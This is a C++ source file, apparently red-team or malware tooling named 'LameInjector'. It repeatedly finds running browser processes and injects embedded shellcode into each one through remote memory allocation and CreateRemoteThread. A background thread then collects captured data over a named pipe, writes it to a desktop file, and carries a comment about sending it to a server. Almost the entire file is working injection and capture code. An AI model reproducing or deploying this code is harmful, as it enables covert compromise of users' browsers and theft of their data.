// LameInjector.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#pragma comment( lib, "psapi.lib" )

#include <iostream>
#include <fstream>
#include <Windows.h>
#include <format>
#include <Psapi.h>
#include <vector>
#include <string>
#include <locale>
#include <codecvt>
#include <unordered_set>
#include <tlhelp32.h>
#include "resource.h"
#include "xor.h"
#include "Util.h"
#include "ProcessUtil.h"
#include "ResourceServer.h"
#include "common.h"

typedef DWORD PID;

HANDLE hTriggerEvent;

const DWORD TEN_SECONDS = 10000;
const DWORD PROCESS_INJECTION_HANDLE_OPTS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                                            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
const int MAX_BUFFER = 5000;



bool InjectShellcode(DWORD pid, Common::EmbeddedResource shellcode) {
    HANDLE hTarget;
    DWORD dOldProtections;

    hTarget = OpenProcess(PROCESS_INJECTION_HANDLE_OPTS, FALSE, pid);
    LPVOID lpRemoteMem = VirtualAllocEx(hTarget, NULL, shellcode.PayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!lpRemoteMem) {
        std::cerr << "Failed to allocate memory in remote process...";
        return false;
    }

    if (!WriteProcessMemory(hTarget, lpRemoteMem, shellcode.Payload, shellcode.PayloadSize, NULL)) {
        std::cerr << "Failed to write shellcode to remote memory...";
        return false;
    }


    if (!VirtualProtectEx(hTarget, lpRemoteMem, shellcode.PayloadSize, PAGE_EXECUTE_READ, &dOldProtections)) {
        std::cerr << "Failed to alter memory protections on remote shellcode";
        return false;
    }

    if (!CreateRemoteThread(hTarget, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteMem, NULL, 0, 0)) {
        std::cerr << "Failed to create remote thread...";
    }
    return true;
}

Common::EmbeddedResource LoadPayload() {
    HMODULE hSelfProcess;
    HRSRC hResource;
    DWORD dResourceSize;
    LPVOID lpShellcode;
    Common::EmbeddedResource payload{ NULL, -1 };


    hSelfProcess = GetModuleHandle(NULL);
    hResource = FindResource(hSelfProcess, MAKEINTRESOURCE(IDR_BINARY1), L"BINARY");
    if (!hResource) {
        return payload;
    }

    lpShellcode = LoadResource(hSelfProcess, hResource);
    if (!lpShellcode) {
        return payload;
    }

    dResourceSize = SizeofResource(hSelfProcess, hResource);
    if (!dResourceSize) {
        return payload;
    }
    payload.PayloadSize = dResourceSize;

    if (!lpShellcode) {
        return payload;
    }

    payload.Payload = VirtualAlloc(0, payload.PayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(payload.Payload, lpShellcode, payload.PayloadSize);
    FreeResource(hResource);
    return payload;
}



bool IsAlreadyRunning() {
    HANDLE hMutex;
    std::wstring username;

    username = Util::GetUsername();
    if (username == L"") {
        return true;
    }

    username = L"m" + username;
   
    auto lpUsername = username.c_str();
    hMutex = CreateMutexW(NULL, false, lpUsername);
    if (!hMutex) {
        std::wcerr << L"Mutex with name: " << username << L" already exists." << std::endl;
        return true;
    }
    return false;
}

std::u16string ReceivePipeData() {
    HANDLE hPipe;
    BYTE data[MAX_BUFFER] = {0};
    WCHAR result[MAX_BUFFER / 2] = { 0 };
    DWORD dataRead = 0;
    BOOL readSuccessful;
    auto username = Util::GetUsername();
    auto pipe_name = L"\\\\.\\pipe\\" + username;


    std::wcout << "Connecting to named pipe: " << pipe_name << std::endl;
    hPipe = CreateFileW(pipe_name.c_str(), 
        GENERIC_READ, 
        0, 
        NULL, 
        OPEN_EXISTING, 
        0, 
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        return u"INVALID PIPE HANDLE";
    }

    std::wcout << "Reading from pipe..." << std::endl;
    readSuccessful = ReadFile(hPipe, data, MAX_BUFFER, &dataRead, NULL);
    if (!readSuccessful) {
        return u"UNABLE TO READ FROM PIPE";
    }

    std::u16string ustr(reinterpret_cast<const char16_t*>(data));

    return ustr;
}

DWORD WINAPI Capture(LPVOID parameter) {
    HANDLE hEvent;
    std::wstring eventName;

    auto username = Util::GetUsername();
    if (username == L"") {
        return -1;
    }
    eventName = L"ev" + username;
    hEvent = CreateEventW(NULL, FALSE, FALSE, eventName.c_str());

    if (!SUCCEEDED(hEvent)) {
        std::wcerr << L"Failed to create event named: " << eventName << std::endl;
        return -1;
    }

    WaitForSingleObject(hEvent, INFINITE);
    std::wcout << L"Event triggered" << std::endl;
    std::u16string captured = ReceivePipeData();
    std::cout << "DATA LENGTH CAPTURED: " << captured.length() << std::endl;
    std::wstring_convert<std::codecvt_utf8<char16_t>, char16_t> converter;
    std::string printable(converter.to_bytes(captured));
    const char* printchars = printable.c_str();
    std::cout << "Data captured: " << printable.c_str() << std::endl;
    std::ofstream outputFile;
    outputFile.open("c:\\users\\ieuser\\desktop\\LIVEBAIT_OUTPUT.txt");
    outputFile << printchars;
    outputFile.flush();
    outputFile.close();
    // write to configured file or server
    return 0;
}

VOID CALLBACK Callback(
    _In_ PVOID   lpParameter,
    _In_ BOOLEAN TimerOrWaitFired
) {
    SetEvent(hTriggerEvent);
}

int main()
{
    HANDLE hResourceServerThread;
    HANDLE hPipeCaptureThread;
    HANDLE hTimerQueue;
    HANDLE hEnumTimer;
    DWORD dwProcesses[1024];
    DWORD dwCount = sizeof(dwProcesses);
    DWORD dwBytesUsed;
    DWORD dwNumProcesses;
    Common::EmbeddedResource shellcode;
    std::string captured;
    std::unordered_set<PID> injected;
    BOOL success;

    //ResourceServer::ServeWebResources(NULL);

    

    if (IsAlreadyRunning()) {
        return 0;
    }
    //captured = Capture();

    hResourceServerThread = ResourceServer::Start();

    hPipeCaptureThread = CreateThread(
        NULL,
        0,
        Capture,
        NULL,
        0,
        NULL
    );
    
    
    shellcode = LoadPayload();
    if (shellcode.PayloadSize == -1) {
        ExitProcess(-1);
    }

    hTriggerEvent = CreateEventW(NULL, FALSE, FALSE, NULL);    
    hTimerQueue = CreateTimerQueue();

    success = CreateTimerQueueTimer(
        &hEnumTimer, 
        hTimerQueue, 
        Callback, 
        NULL, 
        TEN_SECONDS, 
        TEN_SECONDS, 
        WT_EXECUTELONGFUNCTION
    );

    if (!success) {
        return -1;
    }

    while (true) {
        WaitForSingleObject(hTriggerEvent, INFINITE);

        auto pids = Process::EnumerateTopLevelBrowsers();
        
        
        for (DWORD pid : pids) {
            if (injected.find(pid) == injected.end()) { // not found in injected collection
                
                bool success = InjectShellcode(pid, shellcode);
                if (success) {
                    std::cout << "Injected to pid: " << pid << std::endl;
                }
                else {
                    std::cerr << "Failed to inject payload to pid: " << pid << std::endl;
                }
                injected.insert(pid);
            }
        }
        
    }
    WaitForSingleObject(hPipeCaptureThread, INFINITE);
    WaitForSingleObject(hResourceServerThread, INFINITE);
    return 0;
}